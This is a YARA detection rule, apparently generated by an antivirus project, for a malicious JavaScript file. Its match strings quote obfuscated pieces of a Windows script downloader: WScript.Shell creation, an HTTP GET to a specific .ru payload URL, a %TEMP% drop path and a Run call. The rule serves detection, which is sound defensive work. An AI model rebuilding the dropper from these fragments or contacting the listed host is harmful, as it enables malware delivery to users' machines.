rule sig_20160427_855fe729803048b0f788d16abbf6c24b {
  meta:
    description = "datamaliciousorder - file 20160427_855fe729803048b0f788d16abbf6c24b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fd10c3848b89d978a0b22afa4cc0e173cdd5de651ca62c09c44d5e9b94b83519"

  strings:
    $s1  = "function KjyzsCusjd() {return NxeknKcxkn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Ep0zyEh" ascii
    $s2  = "function KjyzsCusjd() {return NxeknKcxkn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Ep0zyEh" ascii
    $s3  = "function NmbmxGbwfa(ApyjaKyldu, NgfhyXgkqw){QqvzlNnzsb = QqvzlNnzsb * 1; return ApyjaKyldu - NgfhyXgkqw;};" fullword ascii
    $s4  = "var NxeknKcxkn = function NqdugJmvxf() {return ShlupHeycn[JelwsRzgoy](\"WScript\"+\".Shell\");}(), IbkdgVkttm = 11;" fullword ascii
    $s5  = "UkzatDydvc[AnzhbMtnkz](\"G\" + \"ET\", \"http://warcraft-lich-king.ru/i4ospd\", false);" fullword ascii
    $s6  = "var ShlupHeycn = this[\"WScript\"];" fullword ascii
    $s7  = "function SfxcoZylbd(){return WfilxPldou + \"\";};" fullword ascii
    $s8  = "if (UkzatDydvc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function CitewJyxxe() {return ((GuxckZqxyw == true) && (GuxckZqxyw == UfhflTsanw)) ? 1 : QqvzlNnzsb;};" fullword ascii
    $s10 = "UfhflTsanw = true; " fullword ascii
    $s11 = "QpehiFhgah = true;" fullword ascii
    $s12 = "var GuxckZqxyw = false;" fullword ascii
    $s13 = "var UfhflTsanw = false;" fullword ascii
    $s14 = "return NmbmxGbwfa(LcxgfLsesr, IwjrtSqzvh);" fullword ascii
    $s15 = "var QpehiFhgah = false;" fullword ascii
    $s16 = "}while (QllfhFcosv);" fullword ascii
    $s17 = "function FkpxkEimek(){return JelwsRzgoy;};" fullword ascii
    $s18 = "function OhzviJscbe(QnsqlKajqf){NxeknKcxkn[\"R\"+\"un\"](QnsqlKajqf, QqvzlNnzsb, QqvzlNnzsb);};" fullword ascii
    $s19 = "function ClbcpJnhdu(){return 23;};" fullword ascii
    $s20 = "function XfamyYfjgi()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}